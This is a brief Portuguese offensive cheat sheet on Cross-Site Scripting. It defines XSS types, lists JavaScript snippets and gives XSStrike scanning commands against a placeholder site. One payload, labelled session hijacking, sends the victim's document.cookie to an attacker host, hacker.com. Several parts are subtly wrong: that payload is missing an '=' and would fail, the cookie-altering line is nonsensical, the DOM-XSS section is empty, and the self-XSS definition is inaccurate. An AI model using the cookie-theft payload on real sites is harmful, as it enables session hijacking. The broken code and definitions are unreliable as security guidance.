# Cross-Site Scripting (XSS)

O XSS é uma das vulnerabilidades que mais ocorre em aplicações web modernas. Essa falha permite inserir códigos de Javascript na aplicação que serão executados de diversas formas. Abaixo estão os tipos de XSS e como eles funcionam.

### Reflected XSS  
O XSS refletido ocorre quando a aplicação recebe a entrada do usuário e exibe ela novamente na página, não afetando outros usuários.  

### Stored XSS  
O XSS armazenado é o mais grave de todos pois permite que o payload seja armazenado no servidor e exibido para todos os usuários que acessarem a página com o código.  

### DOM Based XSS (DOM-XSS)  

### Self-XSS  
O Self-XSS ocorre inserindo código Javascript através de HTML Injection, fechando a tag HTML com `">` e incluindo a tag `<script>` com o comando em Javascript.  

## Exploração  

### Javascript  
Visualizar cookies da vítima  
`alert(document.cookie)`  

Redirecionar vítima para outra página  
`document.location="http://google.com/"`  

### Payloads  
Sequestro de sessão  
`<script>new Image().src"http://www.hacker.com/?="+document.cookie;</script>`  

Alterar cookie usando XSS
`<script>alert(document.cookie)="cookie";</script>`

## Ferramentas

### XSStrike

Teste de XSS em um parâmetro
`xsstrike -u "http://www.alvo.com.br/index.php?p="`

Busca por parametros e realiza o teste de XSS
`xsstrike -u "http://www.alvo.com.br/index.php" --params`

Teste de Self-XSS
`xsstrike -u "http://www.alvo.com.br/index.php/" --path`

**Flags:**
`-t 10`: Aumenta o número de requisições
